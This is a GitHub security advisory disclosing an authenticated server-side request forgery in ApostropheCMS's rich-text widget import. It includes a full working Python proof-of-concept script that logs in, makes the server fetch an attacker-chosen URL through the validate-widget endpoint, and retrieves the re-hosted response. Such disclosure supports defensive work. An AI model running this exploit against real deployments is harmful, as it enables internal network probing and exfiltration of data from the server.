# [H] Apostrophe has authenticated SSRF in rich-text widget import via @apostrophecms/area/validate-widget

## Summary
Severity: High
Advisory: GHSA-pr28-mf3q-qpg6
CVE: CVE-2026-45012
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-pr28-mf3q-qpg6
Type: github-advisory

## Affected
- npm: `apostrophe` — affected >=0

## Details
### Summary
ApostropheCMS contains an authenticated server-side request forgery (SSRF) in the rich-text widget import flow. An authenticated user who can submit/edit rich-text widget content can cause the server to fetch attacker-controlled URLs during widget validation. For image-compatible responses, the fetched content can be persisted and re-hosted by Apostrophe, allowing response exfiltration.

### Details
  The vulnerable flow is in the rich-text widget sanitizer:
  - `packages/apostrophe/modules/@apostrophecms/rich-text-widget/index.js`
  - `packages/apostrophe/modules/@apostrophecms/area/index.js`
  - `packages/apostrophe/modules/@apostrophecms/widget-type/index.js`

Relevant behavior:
  1. The backend accepts a widget payload containing `import.html`.
  2. It parses `<img src=...>` values from that HTML.
  3. For each image, it resolves the URL with:
     - `new URL(src, input.import.baseUrl || self.apos.baseUrl)`
  4. It then performs a server-side `fetch(url)`.
  5. The fetched body is written to a temp file and imported through Apostrophe image/attachment logic.

  This is reachable during widget validation through:
  - `POST /api/v1/@apostrophecms/area/validate-widget?aposMode=draft`


### PoC
 1. Start a local HTTP server with a valid PNG:
```bash
     mkdir -p /tmp/apos-poc
     base64 -d > /tmp/apos-poc/secret.png <<'EOF'
     iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+y1n0AAAAASUVORK5CYII=
     EOF
     cd /tmp/apos-poc && python3 -m http.server 7777 --bind 127.0.0.1
```
2. Run the following Python PoC:
```python
#!/usr/bin/env python3
import argparse
import json
import sys
from urllib.parse import urljoin

import requests


def login(base_url: str, username: str, password: str) -> str:
    url = urljoin(base_url, "/api/v1/@apostrophecms/login/login")
    r = requests.post(
        url,
        json={
            "username": username,
            "password": password
        },
        timeout=20
    )
    r.raise_for_status()
    data = r.json()
    token = data.get("token")
    if not token:
      raise RuntimeError(f"Login succeeded but no token was returned: {data}")
    return token


def trigger(base_url: str, token: str, area_field_id: str, target_url: str) -> dict:
    url = urljoin(
        base_url,
        "/api/v1/@apostrophecms/area/validate-widget?aposMode=draft"
    )
    payload = {
        "areaFieldId": area_field_id,
        "type": "@apostrophecms/rich-text",
        "widget": {
            "type": "@apostrophecms/rich-text",
            "content": "<p>seed</p>",
            "import": {
                "html": f'<img src="{target_url}">',
                "baseUrl": target_url.rsplit("/", 1)[0] if "/" in target_url else target_url
            }
        }
    }
    r = requests.post(
        url,
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/json"
        },
        json=payload,
        timeout=30
    )
    r.raise_for_status()
    return r.json()


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Authenticated ApostropheCMS SSRF PoC via rich-text widget import."
    )
    parser.add_argument("--base-url", default="http://127.0.0.1:3000")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", default="admin123")
    parser.add_argument("--area-field-id", default="cd4f89f5b834d0036f3867f1507a8add")
    parser.add_argument("--target-url", default="http://127.0.0.1:7777/secret.png")
    parser.add_argument(
        "--fetch-image",
        action="store_true",
        help="Fetch the generated Apostrophe image URL after exploitation."
    )
    args = parser.parse_args()

    try:
        token = login(args.base_url, args.username, args.password)
        result = trigger(args.base_url, token, args.area_field_id, args.target_url)
    except Exception as exc:
        print(f"[!] Exploit failed: {exc}", file=sys.stderr)
        return 1

    print("[+] Login OK")
    print(f"[+] Bearer token: {token}")
    print("[+] Exploit response:")
    print(json.dumps(result, indent=2))

    widget = result.get("widget") or {}
    image_ids = widget.get("imageIds") or []
    if not image_ids:
        print("[-] No imageIds returned. Target may have been fetched but not persisted as an image.")
        return 0

    image_id = image_ids[0]
    image_path = f"/api/v1/@apostrophecms/image/{image_id}/src"
    image_url = urljoin(args.base_url, image_path)
    print(f"[+] Generated image id: {image_id}")
    print(f"[+] Generated image URL: {image_url}")

    if args.fetch_image:
        r = requests.get(image_url, allow_redirects=True, timeout=30)
        print(f"[+] Final fetch status: {r.status_code}")
        print(f"[+] Final URL: {r.url}")
        print(f"[+] Retrieved bytes: {len(r.content)}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```
3. Example usage:
```bash
     python3 poc.py \
       --base-url http://127.0.0.1:3000 \
       --username admin \
       --password admin123 \
       --area-field-id cd4f89f5b834d0036f3867f1507a8add \
       --target-url http://127.0.0.1:7777/secret.png \
       --fetch-image
```
  4. Expected result:
      - The local listener receives:
        GET /secret.png HTTP/1.1
      - The API response includes a rewritten Apostrophe image URL and imageIds.
      - The generated image URL can then be fetched through the application.

Additional note:

  - If the target returns non-image content such as secret.txt, the SSRF still occurs, but later image processing can fail. This still allows blind or semi-blind SSRF behavior useful for internal reachability checks and rough port enumeration.

### Impact
An authenticated user with permission to submit or edit rich-text widget content can:
  - trigger server-side requests to internal services (127.0.0.1, private subnets, etc.)
  - perform blind or semi-blind internal port and service discovery
  - exfiltrate image-compatible responses because Apostrophe stores and re-hosts the fetched content

## References
- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-pr28-mf3q-qpg6
- https://nvd.nist.gov/vuln/detail/CVE-2026-45012
- https://github.com/apostrophecms/apostrophe
